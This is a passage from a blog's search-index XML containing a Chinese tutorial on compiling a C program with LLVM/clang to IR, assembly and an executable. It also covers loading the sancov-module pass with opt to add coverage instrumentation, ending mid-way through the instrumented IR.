<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>LLVM编译程序及加载pass</title>
      <link href="/2023/01/08/LLVM%E7%BC%96%E8%AF%91%E7%A8%8B%E5%BA%8F%E5%8F%8A%E5%8A%A0%E8%BD%BDpass/"/>
      <url>/2023/01/08/LLVM%E7%BC%96%E8%AF%91%E7%A8%8B%E5%BA%8F%E5%8F%8A%E5%8A%A0%E8%BD%BDpass/</url>
      
        <content type="html"><![CDATA[<h2 id="1-LLVM和clang"><a href="#1-LLVM和clang" class="headerlink" title="1. LLVM和clang"></a>1. LLVM和clang</h2><h3 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h3><p>LLVM是一个工具链的大集合，包含常用的clang等等。LLVM编译过程：</p><p><img src="/../images/image-20230108163843359.png" alt="image-20230108163843359"></p><p>可以理解为，LLVM将C、C++代码，生成统一的IR，这里的IR可以理解为可读性比较强的汇编，介于高级语言与机器码之间。LLVM后端将IR最终转化为机器码执行。</p><p>常说的编译器优化 -O2 等等，就是发生在对IR的处理上，LLVM提供多种Pass，每个Pass输入为IR格式，输出也为IR格式，从而实现对代码的优化。</p><p>所以如果我们想实现一个简单的基于LLVM的编程语言，其实大概思路只要做好前端部分，即源代码 -&gt; 词法、语法分析等等 -&gt; IR，剩下的过程就可以交给LLVM后端来解决。</p><p>IR是统一的，也就是说可以利用C++生成的IR，和其他语言生成的LLVM IR通过控制LLVM中间过程，最终编译到一个可执行文件中。</p><p><img src="/../images/image-20230114164208644.png" alt="image-20230114164208644"></p><h3 id="clang"><a href="#clang" class="headerlink" title="clang"></a>clang</h3><p>clang简单来说是C&#x2F;C++的编译器，类似于gcc，针对一个C文件test.c，使用clang test.c即可以编译生成a.out可执行文件，跟gcc一样。但狭义上其实clang仅仅指该编译器的前端部分，即由C文件生成中间表现IR的过程，而从IR到可执行文件，是由中后端LLVM完成的。</p><p><img src="/../images/image-20230108163801430.png" alt="image-20230108163801430"></p><h2 id="2-安装编译LLVM"><a href="#2-安装编译LLVM" class="headerlink" title="2. 安装编译LLVM"></a>2. 安装编译LLVM</h2><p>LLVM 15.0.3 源代码：<a href="https://github.com/llvm/llvm-project/releases/tag/llvmorg-15.0.3">https://github.com/llvm/llvm-project/releases/tag/llvmorg-15.0.3</a></p><p>编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake ./llvm-project-15.0.3.src/llvm -DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_ASSERTIONS=ON -DLLVM_ENABLE_PROJECTS=&#x27;clang;lld;libcxxabi;libcxx;clang-tools-extra;openmp&#x27; -DLLVM_TARGETS_TO_BUILD=&quot;AArch64;ARM;X86&quot;</span><br></pre></td></tr></table></figure><p>然后 make 即可</p><p>把bin加入环境变量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export LLVM_HOME=/Users/USERNAME/Desktop/llvm/bin</span><br><span class="line">export PATH=$LLVM_HOME:$PATH</span><br></pre></td></tr></table></figure><p>检查安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  clang --version</span><br><span class="line">clang version 15.0.3</span><br><span class="line">Target: x86_64-apple-darwin21.1.0</span><br><span class="line">Thread model: posix</span><br><span class="line">InstalledDir: /Users/USERNAME/Desktop/llvm/bin</span><br></pre></td></tr></table></figure><p>编译下代码试试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  test clang helloworld.c</span><br><span class="line">➜  test ./a.out</span><br><span class="line">Hello world!</span><br></pre></td></tr></table></figure><h2 id="3-LLVM编译程序过程"><a href="#3-LLVM编译程序过程" class="headerlink" title="3. LLVM编译程序过程"></a>3. LLVM编译程序过程</h2><h3 id="（1）源代码编译成IR"><a href="#（1）源代码编译成IR" class="headerlink" title="（1）源代码编译成IR"></a>（1）源代码编译成IR</h3><h6 id="test-c"><a href="#test-c" class="headerlink" title="test.c"></a>test.c</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a &gt; <span class="number">10</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;AAA\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;BBB\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line">func(a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成bc：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -emit-llvm -c test.c -o test.bc</span><br></pre></td></tr></table></figure><p>生成ll：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -emit-llvm -c -S test.c -o test.ll</span><br></pre></td></tr></table></figure><p>bc和ll都是LLVM IR的格式，区别在于ll格式是可读的：</p><h6 id="test-ll"><a href="#test-ll" class="headerlink" title="test.ll"></a>test.ll</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:o-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-apple-macosx12.0.0&quot;</span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [5 x i8] c&quot;AAA\0A\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [5 x i8] c&quot;BBB\0A\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone ssp uwtable</span><br><span class="line">define void @func(i32 noundef %a) #0 &#123;</span><br><span class="line">entry:</span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">a.addr = alloca i32, align 4</span></span><br><span class="line">  store i32 %a, ptr %a.addr, align 4</span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">0 = load i32, ptr %a.addr, align 4</span></span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">cmp = icmp sgt i32 %0, 10</span></span><br><span class="line">  br i1 %cmp, label %if.then, label %if.else</span><br><span class="line"></span><br><span class="line">if.then:                                          ; preds = %entry</span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">call = call i32 (ptr, ...) @<span class="built_in">printf</span>(ptr noundef @.str)</span></span><br><span class="line">  br label %if.end</span><br><span class="line"></span><br><span class="line">if.else:                                          ; preds = %entry</span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">call1 = call i32 (ptr, ...) @<span class="built_in">printf</span>(ptr noundef @.str.1)</span></span><br><span class="line">  br label %if.end</span><br><span class="line"></span><br><span class="line">if.end:                                           ; preds = %if.else, %if.then</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare i32 @printf(ptr noundef, ...) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone ssp uwtable</span><br><span class="line">define i32 @main() #0 &#123;</span><br><span class="line">entry:</span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">retval = alloca i32, align 4</span></span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">a = alloca i32, align 4</span></span><br><span class="line">  store i32 0, ptr %retval, align 4</span><br><span class="line">  store i32 100, ptr %a, align 4</span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">0 = load i32, ptr %a, align 4</span></span><br><span class="line">  call void @func(i32 noundef %0)</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone ssp uwtable &quot;frame-pointer&quot;=&quot;all&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;penryn&quot; &quot;target-features&quot;=&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line">attributes #1 = &#123; &quot;frame-pointer&quot;=&quot;all&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;penryn&quot; &quot;target-features&quot;=&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0, !1, !2, !3, !4&#125;</span><br><span class="line">!llvm.ident = !&#123;!5&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 2, !&quot;SDK Version&quot;, [2 x i32] [i32 12, i32 0]&#125;</span><br><span class="line">!1 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!2 = !&#123;i32 7, !&quot;PIC Level&quot;, i32 2&#125;</span><br><span class="line">!3 = !&#123;i32 7, !&quot;uwtable&quot;, i32 2&#125;</span><br><span class="line">!4 = !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125;</span><br><span class="line">!5 = !&#123;!&quot;clang version 15.0.3&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>###（2）IR生成可执行文件</p><p>可以lli直接执行bc、ll：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lli test.ll</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230108174712422.png" alt="image-20230108174712422"></p><p>llc编译成汇编：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llc test.ll -o test.s</span><br></pre></td></tr></table></figure><h6 id="test-s"><a href="#test-s" class="headerlink" title="test.s"></a>test.s</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">.section__TEXT,__text,regular,pure_instructions</span><br><span class="line">.build_version macos, 12, 0sdk_version 12, 0</span><br><span class="line">.globl_func                           ## -- Begin function func</span><br><span class="line">.p2align4, 0x90</span><br><span class="line">_func:                                  ## @func</span><br><span class="line">.cfi_startproc</span><br><span class="line">## %bb.0:                               ## %entry</span><br><span class="line">pushq%rbp</span><br><span class="line">.cfi_def_cfa_offset 16</span><br><span class="line">.cfi_offset %rbp, -16</span><br><span class="line">movq%rsp, %rbp</span><br><span class="line">.cfi_def_cfa_register %rbp</span><br><span class="line">subq$16, %rsp</span><br><span class="line">movl%edi, -4(%rbp)</span><br><span class="line">cmpl$10, -4(%rbp)</span><br><span class="line">jleLBB0_2</span><br><span class="line">## %bb.1:                               ## %if.then</span><br><span class="line">leaqL_.str(%rip), %rdi</span><br><span class="line">movb$0, %al</span><br><span class="line">callq_printf</span><br><span class="line">jmpLBB0_3</span><br><span class="line">LBB0_2:                                 ## %if.else</span><br><span class="line">leaqL_.str.1(%rip), %rdi</span><br><span class="line">movb$0, %al</span><br><span class="line">callq_printf</span><br><span class="line">LBB0_3:                                 ## %if.end</span><br><span class="line">addq$16, %rsp</span><br><span class="line">popq%rbp</span><br><span class="line">retq</span><br><span class="line">.cfi_endproc</span><br><span class="line">                                        ## -- End function</span><br><span class="line">.globl_main                           ## -- Begin function main</span><br><span class="line">.p2align4, 0x90</span><br><span class="line">_main:                                  ## @main</span><br><span class="line">.cfi_startproc</span><br><span class="line">## %bb.0:                               ## %entry</span><br><span class="line">pushq%rbp</span><br><span class="line">.cfi_def_cfa_offset 16</span><br><span class="line">.cfi_offset %rbp, -16</span><br><span class="line">movq%rsp, %rbp</span><br><span class="line">.cfi_def_cfa_register %rbp</span><br><span class="line">subq$16, %rsp</span><br><span class="line">movl$0, -8(%rbp)</span><br><span class="line">movl$100, -4(%rbp)</span><br><span class="line">movl-4(%rbp), %edi</span><br><span class="line">callq_func</span><br><span class="line">xorl%eax, %eax</span><br><span class="line">addq$16, %rsp</span><br><span class="line">popq%rbp</span><br><span class="line">retq</span><br><span class="line">.cfi_endproc</span><br><span class="line">                                        ## -- End function</span><br><span class="line">.section__TEXT,__cstring,cstring_literals</span><br><span class="line">L_.str:                                 ## @.str</span><br><span class="line">.asciz&quot;AAA\n&quot;</span><br><span class="line"></span><br><span class="line">L_.str.1:                               ## @.str.1</span><br><span class="line">.asciz&quot;BBB\n&quot;</span><br><span class="line"></span><br><span class="line">.subsections_via_symbols</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译汇编：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  test clang test.s -isysroot `xcrun --show-sdk-path` -o ./test</span><br><span class="line">➜  test ./test</span><br><span class="line">AAA</span><br></pre></td></tr></table></figure><h3 id="（3）LLVM-Pass"><a href="#（3）LLVM-Pass" class="headerlink" title="（3）LLVM  Pass"></a>（3）LLVM  Pass</h3><p>以上基本执行了LLVM编译C程序的过程。文章开头说到，编译器对代码的优化等处理过程是由一个个Pass来处理，每个Pass输入为IR，输出也是IR，这里尝试对test.ll这个IR增加覆盖率统计sancov。</p><h6 id="还是原本的test-ll"><a href="#还是原本的test-ll" class="headerlink" title="还是原本的test.ll"></a>还是原本的test.ll</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:o-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-apple-macosx12.0.0&quot;</span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [5 x i8] c&quot;AAA\0A\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [5 x i8] c&quot;BBB\0A\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone ssp uwtable</span><br><span class="line">define void @func(i32 noundef %a) #0 &#123;</span><br><span class="line">entry:</span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">a.addr = alloca i32, align 4</span></span><br><span class="line">  store i32 %a, ptr %a.addr, align 4</span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">0 = load i32, ptr %a.addr, align 4</span></span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">cmp = icmp sgt i32 %0, 10</span></span><br><span class="line">  br i1 %cmp, label %if.then, label %if.else</span><br><span class="line"></span><br><span class="line">if.then:                                          ; preds = %entry</span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">call = call i32 (ptr, ...) @<span class="built_in">printf</span>(ptr noundef @.str)</span></span><br><span class="line">  br label %if.end</span><br><span class="line"></span><br><span class="line">if.else:                                          ; preds = %entry</span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">call1 = call i32 (ptr, ...) @<span class="built_in">printf</span>(ptr noundef @.str.1)</span></span><br><span class="line">  br label %if.end</span><br><span class="line"></span><br><span class="line">if.end:                                           ; preds = %if.else, %if.then</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare i32 @printf(ptr noundef, ...) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone ssp uwtable</span><br><span class="line">define i32 @main() #0 &#123;</span><br><span class="line">entry:</span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">retval = alloca i32, align 4</span></span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">a = alloca i32, align 4</span></span><br><span class="line">  store i32 0, ptr %retval, align 4</span><br><span class="line">  store i32 100, ptr %a, align 4</span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">0 = load i32, ptr %a, align 4</span></span><br><span class="line">  call void @func(i32 noundef %0)</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone ssp uwtable &quot;frame-pointer&quot;=&quot;all&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;penryn&quot; &quot;target-features&quot;=&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line">attributes #1 = &#123; &quot;frame-pointer&quot;=&quot;all&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;penryn&quot; &quot;target-features&quot;=&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0, !1, !2, !3, !4&#125;</span><br><span class="line">!llvm.ident = !&#123;!5&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 2, !&quot;SDK Version&quot;, [2 x i32] [i32 12, i32 0]&#125;</span><br><span class="line">!1 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!2 = !&#123;i32 7, !&quot;PIC Level&quot;, i32 2&#125;</span><br><span class="line">!3 = !&#123;i32 7, !&quot;uwtable&quot;, i32 2&#125;</span><br><span class="line">!4 = !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125;</span><br><span class="line">!5 = !&#123;!&quot;clang version 15.0.3&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>加载pass：sancov-module 并且添加相应的–sanitizer-coverage-trace-pc-guard、–sanitizer-coverage-level选项</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  test opt --passes=sancov-module test.ll -o test.cov.ll --sanitizer-coverage-trace-pc-guard --sanitizer-coverage-level=3 -S</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.ll&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:o-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-apple-macosx12.0.0&quot;</span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [5 x i8] c&quot;AAA\0A\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [5 x i8] c&quot;BBB\0A\00&quot;, align 1</span><br><span class="line">@__sancov_lowest_stack = external thread_local(initialexec) global i64</span><br><span class="line">@__sancov_gen_ = private global [3 x i32] zeroinitializer, section &quot;__DATA,__sancov_guards&quot;, align 4</span><br><span class="line">@__sancov_gen_.1 = private global [1 x i32] zeroinitializer, section &quot;__DATA,__sancov_guards&quot;, align 4</span><br><span class="line">@&quot;\01section$start$__DATA$__sancov_guards&quot; = extern_weak hidden global i32</span><br><span class="line">@&quot;\01section$end$__DATA$__sancov_guards&quot; = extern_weak hidden global i32</span><br><span class="line">@llvm.global_ctors = appending global [1 x &#123; i32, ptr, ptr &#125;] [&#123; i32, ptr, ptr &#125; &#123; i32 2, ptr @sancov.module_ctor_trace_pc_guard, ptr null &#125;]</span><br><span class="line">@llvm.used = appending global [3 x ptr] [ptr @sancov.module_ctor_trace_pc_guard, ptr @__sancov_gen_, ptr @__sancov_gen_.1], section &quot;llvm.metadata&quot;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone ssp uwtable</span><br><span class="line">define void @func(i32 noundef %a) #0 &#123;</span><br><span class="line">entry:</span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">a.addr = alloca i32, align 4</span></span><br><span class="line">  call void @__sanitizer_cov_trace_pc_guard(ptr @__sancov_gen_) #3</span><br><span class="line">  store i32 %a, ptr %a.addr, align 4</span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">0 = load i32, ptr %a.addr, align 4</span></span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">cmp = icmp sgt i32 %0, 10</span></span><br><span class="line">  br i1 %cmp, label %if.then, label %if.else</span><br><span class="line"></span><br><span class="line">if.then:                                          ; preds = %entry</span><br><span class="line">  call void @__sanitizer_cov_trace_pc_guard(ptr inttoptr (i64 add (i64 ptrtoint (ptr @__sancov_gen_ to i64), i64 4) to ptr)) #3</span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">call = call i32 (ptr, ...) @<span class="built_in">printf</span>(ptr noundef @.str)</span></span><br><span class="line">  br label %if.end</span><br><span class="line"></span><br><span class="line">if.else:                                          ; preds = %entry</span><br><span class="line">  call void @__sanitizer_cov_trace_pc_guard(ptr inttoptr (i64 add (i64 ptrtoint (ptr @__sancov_gen_ to i64), i64 8) to ptr)) #3</span><br><span class="line"><span class="meta prompt_">  %</span><span class="language-bash">call1 = call i32 (ptr, ...) @<span class="built_in">printf</span>(ptr noundef @.str.1)</span></span><br><span class="line">  br label %if.end</span><br><span class="line"></span><br><span class="line">if.end:                                           ; preds = %if.else, %if.then</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare i32 @printf(ptr noundef, ...) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone ssp uwtable</span><br><span class="line">define i32 @main() #0 &#123;</span><br><span class="line">entry:</span><br><span class="line"><span 